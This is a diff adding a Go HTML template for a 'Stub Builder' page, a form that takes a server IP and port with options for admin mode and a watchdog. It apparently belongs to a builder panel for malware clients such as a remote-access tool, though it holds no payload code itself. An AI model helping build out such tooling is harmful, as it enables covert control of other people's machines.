@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Stub Builder</title>
+</head>
+<body>
+    <h2>Stub Builder</h2>
+    <form method="POST" action="/builder">
+        <div>
+            <label for="server_ip">Server IP:</label>
+            <input type="text" id="server_ip" name="server_ip" required value="localhost">
+        </div>
+        <div>
+            <label for="server_port">Server Port:</label>
+            <input type="text" id="server_port" name="server_port" required value="8080">
+        </div>
+        <div>
+            <input type="checkbox" id="admin_mode" name="admin_mode" value="true">
+            <label for="admin_mode">Enable Admin Mode (requires stub to run as admin)</label>
+        </div>
+        <div>
+            <input type="checkbox" id="enable_watchdog" name="enable_watchdog" value="true">
+            <label for="enable_watchdog">Enable Watchdog</label>
+        </div>
+        <button type="submit">Build Stub</button>
+    </form>
+    {{if .Message}}
+        <p>{{.Message}}</p>
+    {{end}}
+</body>
+</html>
